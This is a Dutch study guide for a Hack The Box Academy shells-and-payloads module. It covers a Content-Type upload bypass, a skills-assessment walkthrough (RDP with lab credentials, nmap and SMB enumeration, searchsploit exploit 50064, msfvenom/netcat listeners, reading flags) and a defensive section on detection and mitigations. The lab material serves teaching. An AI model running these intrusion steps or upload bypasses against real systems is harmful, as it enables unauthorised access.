Burp Suite is hier je beste vriend omdat de controle van de website client-side (in de browser) of heel simpel op de header gebeurt. Door de Content-Type aan te passen, denkt de PHP-interpreter van de server: "Oh, dit is een afbeelding, dat is veilig," terwijl hij het bestand door de .php extensie later gewoon als code uitvoert.

Dit is het moment waar alles samenkomt: de Skills Assessment. Je hebt een foothold-machine gekregen van waaruit je het interne netwerk (172.16.0.0/23) moet aanvallen.
De Eerste Stap: Verbinding maken

Omdat je de doelen alleen kunt bereiken vanaf de foothold-machine, moet je eerst inloggen via RDP.

    Spawn de Target: Klik op de knop om de target te starten en noteer het IP-adres.

    Start XfreeRDP: Gebruik het volgende commando in je Pwnbox terminal: xfreerdp /v:<TARGET_IP> /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution

    Binnen de Foothold: Je komt nu op een Parrot Linux desktop. Open daar een terminal. Dit is je uitvalsbasis voor de drie targets.

Strategie voor Host-1 (Windows)

Vraag: Wat is de hostname en welke map staat er in C:\Shares?

    Scannen: Gebruik nmap om Host-1 te vinden in het 172.16.x.x netwerk (check je eigen IP met ip add om te zien in welk subnet je zit).

    Exploitatie: Kijk naar open poorten zoals SMB (445) of HTTP (80).

        Als SMB open is, probeer smbclient -L \\\\<HOST-1-IP> of nxc smb <HOST-1-IP> -u '' -p '' om shares te zien.

    Shell: Zodra je een shell hebt (bijv. via een exploit of psexec), typ hostname voor de eerste vraag en ls C:\Shares\ voor de tweede.

Strategie voor Host-2 (Linux & Web App)

Vraag: Welke distro, welke taal gebruikt exploit 50064.rb, en wat is de flag?

    Exploit 50064.rb: De vraag verklapt de exploit al. Zoek deze op in je foothold machine: searchsploit -m 50064

    Bestand bekijken: Open het Ruby-bestand (.rb). Kijk in de code welke payload er wordt gegenereerd (zoek naar "payload" of "shell"). Dit beantwoordt de vraag over de taal (meestal PHP voor blog-sites).

    Distro: Zodra je de shell hebt via de exploit, typ cat /etc/os-release.

Strategie voor Host-3 (Windows Server)

Vraag: Wat is de hostname en de flag op de Administrator desktop?

    Hostname: Gebruik nmap -sV of eenmaal binnen het commando hostname.

    Flag: Dit is vaak een Windows exploit (zoals EternalBlue of een web-kwetsbaarheid). Eenmaal binnen als Administrator: type C:\Users\Administrator\Desktop\Skills-flag.txt

Belangrijke herinnering voor Listeners

Omdat je vanaf een foothold werkt, moet je msfvenom of nc listeners instellen op het IP-adres van de foothold-machine in het interne netwerk, niet je Pwnbox IP!

Je bent aangekomen bij de laatste loodjes van de module! Hier is de vertaling en een overzichtelijke samenvatting van het onderdeel Detection & Prevention (Detectie & Preventie). Dit deel focust op de verdedigende kant: hoe spotten we die shells en payloads waar we eerder mee hebben gewerkt?
Detectie & Preventie: De Verdedigingslinie

We laten het "super-spy" werk even achter ons en kijken naar de defensieve kant. Dit hoofdstuk onderzoekt hoe we actieve shells kunnen detecteren, payloads op een host of in netwerkverkeer kunnen vinden, en hoe aanvallers proberen deze beveiliging te omzeilen.
1. Monitoring & Het MITRE ATT&CK Framework

Voordat we naar tools kijken, gebruiken we het MITRE ATT&CK Framework om het gedrag van aanvallers te categoriseren. Drie tactieken zijn cruciaal voor Shells & Payloads:

    Initial Access (Initiële Toegang): Hoe komt een aanvaller binnen? Denk aan het misbruiken van een webapplicatie (zoals de WonderCMS die je net hebt gehackt) of een openstaande SMB-service.

    Execution (Uitvoering): Hier draait deze module om. Het uitvoeren van code op het slachtoffer, zoals een PowerShell one-liner, een Metasploit exploit of het uploaden van een PHP-shell.

    Command & Control (C2): Het onderhouden van de verbinding. Dit kan via standaardpoorten (HTTP/HTTPS) of via applicaties zoals Discord of Slack om onopvallend te blijven.

2. Waar moet je op letten? (Events to Watch)

    Bestandsuploads: Houd applicatielogs in de gaten. Is er zojuist een .php of .exe bestand geüpload naar een map waar dat niet hoort?

    Verdachte acties van gebruikers: Wanneer heeft een normale gebruiker voor het laatst whoami getypt in de opdrachtprompt? Bijna nooit. Dit zijn sterke indicatoren van een inbraak.

    Afwijkend netwerkverkeer: Let op "top talkers" of verbindingen op vreemde poorten (zoals poort 4444, de standaardpoort van Meterpreter).

3. Netwerkzichtbaarheid (Network Visibility)

Zichtbaarheid is alles. Als je niet weet hoe je netwerk eruitziet, zie je ook niet wanneer er iets vreemds gebeurt.

    Deep Packet Inspection (DPI): Moderne firewalls kunnen ín de pakketjes kijken. Als verkeer niet versleuteld is (zoals bij een standaard Netcat shell), kan de firewall letterlijk de commando's zien die de hacker typt.

    Clear Text gevaar: In Wireshark kun je een TCP-stream volgen. Als een hacker een nieuwe gebruiker aanmaakt met net user hacker password123 /add, is dat direct zichtbaar in de netwerkdata.

4. Bescherming van Endpoints (Eindapparaten)

Of het nu een workstation, server of printer is: elk apparaat met een netwerkverbinding is een doelwit.

    Windows Defender: Laat dit altijd aanstaan. Het kan de uitvoering van payloads blokkeren en shell-sessies verbreken.

    Patch Management: Update je systemen direct nadat Microsoft of Linux-distributeurs pleisters (patches) uitbrengen voor kwetsbaarheden.

5. Belangrijke Mitigaties (Maatregelen)

    Application Sandboxing: Beperk de schade die een gehackte applicatie kan aanrichten door deze in een afgeschermde omgeving ("sandbox") te draaien.

    Least Privilege (Minste Privileges): Geef gebruikers alleen de rechten die ze echt nodig hebben. Een normale werknemer heeft geen Administrator-rechten nodig.

    Segmentatie & Hardening: Plaats webservers in een DMZ (Gedemilitariseerde Zone). Als de webserver gehackt wordt, kan de aanvaller niet zomaar doorstromen naar de rest van je interne netwerk.

    Firewalls: Blokkeer onnodig uitgaand verkeer. Als een server alleen op poort 80 en 443 mag praten, blokkeert de firewall een reverse shell die probeert te verbinden op poort 4444.

Samenvattend

Een sterke verdediging bestaat uit meerdere lagen (Defense-in-Depth). Er is niet één gouden oplossing, maar door netwerkmonitoring, endpointbeveiliging en het principe van de minste privileges te combineren, maak je het een aanvaller extreem moeilijk.


